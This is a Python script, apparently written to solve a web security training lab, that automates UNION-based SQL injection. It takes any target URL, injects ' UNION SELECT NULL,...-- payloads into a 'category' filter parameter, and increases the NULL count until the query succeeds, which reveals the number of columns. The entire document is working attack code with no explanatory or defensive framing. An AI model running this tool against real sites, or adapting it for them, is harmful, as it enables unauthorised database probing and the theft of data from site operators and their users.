import requests
import argparse
import sys
from urllib.parse import urlparse
from urllib.parse import quote


def get_endpoint(url):
    endpoint = "filter?category=Pets"
    parse_url = urlparse(url)
    return f"{parse_url.scheme}://{parse_url.netloc}/{endpoint}"


def send_exploit(url):
    print("Exploiting target...")
    print("-"*50)
    endpoint = get_endpoint(url)
    nulls = []
    final_payload = []
    while True:
        nulls.append("NULL")
        iterator = ','.join(nulls)
        payload = f"' UNION SELECT {iterator}--"
        exploit = f"{endpoint}{payload}"
        encoded_exploit = quote(exploit, safe=':/?=')
        try:
            response = requests.get(encoded_exploit)
            response.raise_for_status()
        except requests.exceptions.HTTPError:
            if response.status_code == 500:
                print(f"Testing with payload: {payload} (FAILED)")
                continue
        except requests.exceptions.ConnectionError:
            print(f"Connection error occurred\nCheck again if the host is up!!!")
            print("-"*50)
            print("Failed to exploit the target!!!")
            sys.exit(1)
        if nulls:
            print(f"Testing with payload: {payload} (SUCCESS)")
            final_payload.append(payload)
            break
    print("-"*50)

    return [len(nulls), final_payload[0], response.status_code]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "url", help="the target's URL (eg: http://example.com)")
    args = parser.parse_args()
    input_url = args.url

    exploit = send_exploit(input_url)
    print(f"Endpoint: {get_endpoint(input_url)}")
    print(f"Payload: {exploit[1]}")
    print(f"Number of Columns: {exploit[0]}")
    if exploit[2] != 200:
        print("-"*50)
        print("Failed to exploit the target!!!")
    else:
        print("-"*50)
        print("Exploiting success!!!")


if __name__ == "__main__":
    main()
